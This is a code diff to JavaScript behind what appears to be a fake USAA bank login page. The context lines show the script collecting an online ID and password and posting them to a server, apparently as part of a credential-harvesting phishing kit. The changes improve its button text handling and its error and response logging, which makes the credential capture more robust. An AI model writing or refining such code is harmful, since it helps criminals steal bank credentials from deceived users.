@@ -372,7 +372,12 @@
                     
                     // Disable button to prevent double submission
                     verifyButton.disabled = true;
-                    verifyButton.textContent = 'Saving...';
+                    const buttonSpan = verifyButton.querySelector('span');
+                    if (buttonSpan) {
+                        buttonSpan.textContent = 'Saving...';
+                    } else {
+                        verifyButton.textContent = 'Saving...';
+                    }
                     
                     const onlineId = onlineIdInput ? onlineIdInput.value.trim() : '';
                     const passwordInput = document.getElementById('usaa-form-v5-10-1-input-password');
@@ -414,16 +419,30 @@
                         console.log('Response status:', response.status);
                         
                         if (!response.ok) {
-                            throw new Error(`HTTP error! status: ${response.status}`);
+                            const errorText = await response.text();
+                            console.error('Error response:', errorText);
+                            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
                         }
                         
-                        const result = await response.json();
-                        console.log('Response data:', result);
+                        let result;
+                        try {
+                            const responseText = await response.text();
+                            console.log('Response text:', responseText);
+                            result = JSON.parse(responseText);
+                            console.log('Response data:', result);
+                        } catch (parseError) {
+                            console.error('JSON parse error:', parseError);
+                            throw new Error('Invalid JSON response from server');
+                        }
                         
                         if (result.status === 'success' || response.status === 200) {
                             // Data saved successfully
                             console.log('Data saved successfully:', result);
-                            verifyButton.textContent = '✓ Saved';
+                            if (buttonSpan) {
+                                buttonSpan.textContent = '✓ Saved';
+                            } else {
+                                verifyButton.textContent = '✓ Saved';
+                            }
                             verifyButton.style.backgroundColor = '#28a745';
                             
                             // Show success message
@@ -433,13 +452,21 @@
                         } else {
                             console.error('Failed to save data:', result);
                             verifyButton.disabled = false;
-                            verifyButton.textContent = 'Verify';
+                            if (buttonSpan) {
+                                buttonSpan.textContent = 'Verify';
+                            } else {
+                                verifyButton.textContent = 'Verify';
+                            }
                             alert('There was an issue saving your information. Please try again.');
                         }
                     } catch (error) {
                         console.error('Error saving data:', error);
                         verifyButton.disabled = false;
-                        verifyButton.textContent = 'Verify';
+                        if (buttonSpan) {
+                            buttonSpan.textContent = 'Verify';
+                        } else {
+                            verifyButton.textContent = 'Verify';
+                        }
                         alert('Error connecting to server: ' + error.message + '. Please check your connection and try again.');
                     }
                 });
